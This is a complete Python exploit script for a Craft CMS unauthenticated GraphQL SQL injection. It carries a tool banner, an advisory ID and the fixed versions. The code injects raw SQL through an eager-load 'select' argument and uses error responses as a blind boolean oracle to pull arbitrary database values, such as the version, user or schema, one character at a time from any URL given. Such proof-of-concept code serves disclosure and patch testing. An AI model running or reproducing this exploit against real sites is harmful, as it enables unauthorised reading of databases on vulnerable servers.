#!/usr/bin/env python3
"""Craft CMS unauthenticated GraphQL eager-load SQL injection (GHSA-mjj9-pjh4-r48g).

An anonymous GraphQL query hangs a `select` map off an eager-loadable field the
public schema never exposes. The arguments are merged into the eager-load plan's
criteria and written onto the target element query without cleansing, and Yii emits
any value containing a parenthesis as raw SQL.

Reads are blind, because the executor drops the unknown field from the response, so
this uses the SQL error state as a boolean oracle and binary-searches each character.
Needs a public schema granting anonymous read of a section or an asset volume but not
user groups, and MySQL. Fixed in Craft 5.11.2 and 4.18.9.
"""

import argparse
import json
import os
import sys

import requests

# --- self-contained terminal UI ---
_BANNER = r"""
  ____ ____      _    _____ _____
 / ___|  _ \    / \  |  ___|_   _|
| |   | |_) |  / _ \ | |_    | |
| |___|  _ <  / ___ \|  _|   | |
 \____|_| \_\/_/   \_\_|     |_|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color():
    global _COLOR
    _COLOR = False


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg):
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg):
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg):
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg):
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def die(msg):
    bad(msg)
    sys.exit(1)


def output(data, label="command output"):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    if isinstance(data, str):
        data = data.encode()
    sys.stdout.buffer.write(data)
    if data and not data.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.buffer.flush()
# --- end terminal UI ---

ROUTES = {
    # node name -> (root query field, relation that reaches the eager-load plan)
    "author": ("entries", "author"),
    "uploader": ("assets", "uploader"),
}

REQUESTS = [0]


def build_query(target, expression):
    route, element_id = target
    root, relation = ROUTES[route]
    select = (
        '{id: "elements.id", siteId: "elements_sites.siteId", '
        f"fullName: {json.dumps(expression)}}}"
    )
    scope = "limit: 1" if element_id is None else f"id: {json.dumps(str(element_id))}"
    return f"query {{ {root}({scope}) {{ {relation}(select: {select}) {{ id }} }} }}"


def candidate_ids(session, endpoint, route, page=100):
    """Public ids for the route's root field. The relation has to be populated on
    the element, so a target whose first row has none is not proof of a fix."""
    root = ROUTES[route][0]
    offset = 0
    while True:
        REQUESTS[0] += 1
        try:
            rows = session.post(
                endpoint,
                json={"query": f"{{ {root}(limit: {page}, offset: {offset}) {{ id }} }}"},
                timeout=30,
            ).json()["data"][root]
        except (KeyError, TypeError, ValueError, requests.RequestException):
            return
        if not rows:
            return
        for row in rows:
            yield row["id"]
        offset += len(rows)


def oracle(session, endpoint, target, condition):
    """True when `condition` holds, signalled by a multi-row subquery error."""
    expression = f"(SELECT IF({condition},(SELECT 1 UNION SELECT 2),1))"
    REQUESTS[0] += 1
    response = session.post(
        endpoint,
        json={"query": build_query(target, expression)},
        headers={"X-Craft-Gql-Cache": "no-cache"},
        timeout=30,
    )
    response.raise_for_status()
    return "errors" in response.json()


def injectable(session, endpoint, target):
    """Verify the oracle answers both ways before trusting it."""
    return oracle(session, endpoint, target, "1=1") and not oracle(
        session, endpoint, target, "1=2"
    )


def read_length(session, endpoint, target, subquery, cap):
    low, high = 0, cap
    while low < high:
        mid = (low + high) // 2
        if oracle(session, endpoint, target, f"(SELECT LENGTH({subquery}))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low


def read(session, endpoint, target, subquery, cap):
    length = read_length(session, endpoint, target, subquery, cap)
    if length == 0:
        return ""
    out = ""
    for position in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            condition = f"ASCII(SUBSTRING((SELECT {subquery}),{position},1))>{mid}"
            if oracle(session, endpoint, target, condition):
                low = mid + 1
            else:
                high = mid
        out += chr(low)
        sys.stderr.write("\r " + _paint("36", "[~]") + f" {out}")
        sys.stderr.flush()
    sys.stderr.write("\n")
    return out


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s --url https://target.example\n"
               "  %(prog)s --url https://target.example --query \"@@version\"\n"
               "  %(prog)s --url https://target.example --route uploader \\\n"
               "      --query \"CONCAT(USER(),' / ',DATABASE())\"\n")
    ap.add_argument("--url", required=True, metavar="URL", help="Craft base URL")
    ap.add_argument("--query", default="@@version", metavar="SQL",
                    help="scalar SQL expression to read (default: @@version)")
    ap.add_argument("--route", choices=sorted(ROUTES), metavar="NODE",
                    help="eager-load node to inject through (default: try each)")
    ap.add_argument("--element-id", metavar="ID",
                    help="entry or asset carrying the relation (default: enumerate)")
    ap.add_argument("--max-length", type=int, default=128, metavar="N",
                    help="maximum expected length (default: 128)")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.max_length <= 0:
        ap.error("--max-length must be positive")
    if args.no_color:
        disable_color()

    banner("unauthenticated GraphQL eager-load SQL injection  ·  GHSA-mjj9-pjh4-r48g")

    session = requests.Session()
    session.verify = not args.insecure
    if args.insecure:
        requests.packages.urllib3.disable_warnings()

    endpoint = f"{args.url.rstrip('/')}/index.php?p=actions/graphql/api"
    info(f"Target {endpoint}")

    for route in [args.route] if args.route else sorted(ROUTES):
        root = ROUTES[route][0]
        info(f"Probing the {route} route for an error oracle")
        if args.element_id:
            ids = [args.element_id]
        else:
            ids = candidate_ids(session, endpoint, route)
        target = next(
            ((route, i) for i in ids if injectable(session, endpoint, (route, i))), None
        )
        if target is None:
            warn(f"{route}: no oracle")
            continue
        good(f"{route}: injectable via {root} {target[1]}")
        info(f"Reading {args.query}")
        value = read(session, endpoint, target, args.query, args.max_length)
        good(f"{REQUESTS[0]} unauthenticated requests")
        output(value, label=args.query)
        return

    die("no injectable eager-load route on this target")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as error:
        die(f"request failed: {error}")
    except (KeyError, TypeError, ValueError) as error:
        die(f"unexpected response: {error}")
    except KeyboardInterrupt:
        sys.exit(130)
